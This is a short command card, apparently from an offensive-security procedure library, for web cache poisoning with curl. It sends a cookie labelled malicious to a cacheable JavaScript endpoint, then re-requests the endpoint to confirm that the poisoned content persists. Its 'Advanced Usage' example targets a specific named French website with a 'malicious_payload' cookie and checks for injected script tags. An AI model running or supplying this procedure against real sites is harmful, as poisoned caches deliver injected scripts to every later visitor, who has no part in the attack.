---
id: g7h8i9j0-k1l2-3456-ghij-789012345678
name: curl-poison-cache
type: command
executor: bash
data: 'curl -H "Cookie: hav=VALUE" URL -v'
output: null
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.636Z'
platforms:
  - Linux
  - macOS
  - Windows
tags:
  - http
  - cache
  - poisoning
verified: false
validated: true
submitted: true
---

# curl-poison-cache

## Command

```bash
curl -H "Cookie: hav=VALUE" URL -v
```

## Description

Performs a request to a cacheable endpoint with malicious cookie to poison the cache; follow up without cookie to verify persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: hav=VALUE"` | Malicious cookie for poisoning | Yes |
| `URL` | Cacheable JS endpoint | Yes |
| `-v` | Verbose for cache headers | No |

## Examples

### Basic Usage

```bash
curl https://example.com/cache.js -v
```

### Advanced Usage

```bash
curl -H "Cookie: hav=malicious_payload" https://www.abritel.fr/...php.js?xxxd -v
curl https://www.abritel.fr/...php.js?xxxd | grep script  # Verify poison
```

## Expected Output

Response with cached malicious content on second request, e.g., injected script tags.

## Related

- [[Related Procedure: Poison-Cache-with-Malicious-JavaScript-Endpoint]]
